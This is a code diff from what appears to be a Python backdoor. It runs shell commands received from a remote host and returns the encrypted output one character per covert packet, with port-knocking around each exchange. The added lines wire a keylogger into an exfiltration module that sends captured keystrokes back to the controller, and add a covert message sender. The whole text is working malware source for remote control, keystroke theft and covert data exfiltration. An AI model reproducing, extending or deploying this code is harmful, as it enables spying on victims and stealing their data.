@@ -83,7 +83,10 @@ def executeCommand(srcAddress, pacType, command):
 			send(utils.covertPacket(srcAddress, pacType, c, pswd), verbose=0)
 		knockCode(srcAddress, pacType, False)
 	elif "?keylogger" in command:
-		spyFunctions.startKeylogger()
+		if not spyFunctions.logger:
+			exfil.startKeylogger(srcAddress, pacType)
+		else:
+			exfil.stopKeylogger()
 	else:
 		sendThread = threading.Thread(target=sendResults, args=(srcAddress,pacType,command))
 		sendThread.start()
@@ -93,6 +96,15 @@ def sendResults(address, protocol, comm):
 	results = subprocess.Popen(comm, shell=True, stdout=PIPE).stdout.read()
 
 	results = utils.encryptData(results)
+	for c in results:
+		send(utils.covertPacket(address, protocol, c, pswd), verbose=0)
+
+	knockCode(address, protocol, False)
+
+def sendMessage(address, protocol, comm, message):
+	knockCode(address, protocol, True)
+
+	results = utils.encryptData(message)
 	for c in results:
 		send(utils.covertPacket(address, protocol, c, pswd), verbose=0)
 
